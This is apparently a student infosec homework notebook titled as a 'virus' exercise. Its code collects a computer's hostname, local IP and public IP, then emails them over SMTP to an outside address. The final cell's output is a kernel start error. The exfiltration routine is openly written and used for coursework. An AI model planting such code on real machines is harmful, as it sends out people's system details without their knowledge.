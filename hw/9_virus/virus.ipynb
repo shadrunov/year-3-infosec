{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import smtplib as smtp\n",
    "import socket\n",
    "# from requests import get\n",
    "import urllib.request\n",
    "# from getpass import getpass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "hostname = socket.gethostname()\n",
    "local_ip = socket.gethostbyname(hostname)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "alex-nb 192.168.43.22\n"
     ]
    }
   ],
   "source": [
    "print(hostname, local_ip)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "31.173.81.249\n"
     ]
    }
   ],
   "source": [
    "\n",
    "\n",
    "public_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')\n",
    "\n",
    "print(public_ip)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "ename": "",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31mFailed to start the Kernel. \n",
      "\u001b[1;31m[TerminalIPythonApp] WARNING | Unrecognized alias: 'ip', it will have no effect.\n",
      "\u001b[1;31m[TerminalIPythonApp] WARNING | Unrecognized alias: 'stdin', it will have no effect.\n",
      "\u001b[1;31m[TerminalIPythonApp] WARNING | Unrecognized alias: 'control', it will have no effect.\n",
      "\u001b[1;31m[TerminalIPythonApp] WARNING | Unrecognized alias: 'hb', it will have no effect.\n",
      "\u001b[1;31m[TerminalIPythonApp] WARNING | Unrecognized alias: 'shell', it will have no effect.\n",
      "\u001b[1;31m[TerminalIPythonApp] WARNING | Unrecognized alias: 'transport', it will have no effect.\n",
      "\u001b[1;31m[TerminalIPythonApp] WARNING | Unrecognized alias: 'iopub', it will have no effect.\n",
      "\u001b[1;31m[TerminalIPythonApp] WARNING | Unrecognized alias: 'f', it will have no effect.\n",
      "\u001b[1;31m0.00s - Debugger warning: It seems that frozen modules are being used, which may\n",
      "\u001b[1;31m0.00s - make the debugger miss breakpoints. Please pass -Xfrozen_modules=off\n",
      "\u001b[1;31m0.00s - to python to disable frozen modules.\n",
      "\u001b[1;31m0.00s - Note: Debugging will proceed. Set PYDEVD_DISABLE_FILE_VALIDATION=1 to disable this validation.\n",
      "\u001b[1;31m/home/alex/Documents/year-3-infosec/hw/9_virus/.venv/lib/python3.11/site-packages/IPython/core/interactiveshell.py:2974: UserWarning: Unknown failure executing module: <ipykernel_launcher>\n",
      "\u001b[1;31m  warn('Unknown failure executing module: <%s>' % mod_name). \n",
      "\u001b[1;31mView Jupyter <a href='command:jupyter.viewOutput'>log</a> for further details."
     ]
    }
   ],
   "source": [
    "email = 'shadrunovas@yandex.ru'\n",
    "password = \"\"\n",
    "dest_email = 'shadrunovas@gmail.com'\n",
    "subject = 'IP'\n",
    "email_text = (f'Host: {hostname}\\nLocal IP: {local_ip}\\nPublic IP: {public_ip}')\n",
    "message = 'From: {}\\nTo: {}\\nSubject: {}\\n\\n{}'.format(email, dest_email, subject, email_text)\n",
    "server = smtp.SMTP_SSL('smtp.yandex.com')\n",
    "# server.set_debuglevel(1)\n",
    "server.ehlo(email)\n",
    "server.login(email, password)\n",
    "server.auth_plain()\n",
    "server.sendmail(email, dest_email, message)\n",
    "server.quit()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3 (main, Apr  5 2023, 15:52:25) [GCC 12.2.1 20230201]"
  },
  "vscode": {
   "interpreter": {
    "hash": "1374bbdb787c8efa13ddda3b82775a8c962ffc7368d3fb0162aa51df819fe3db"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
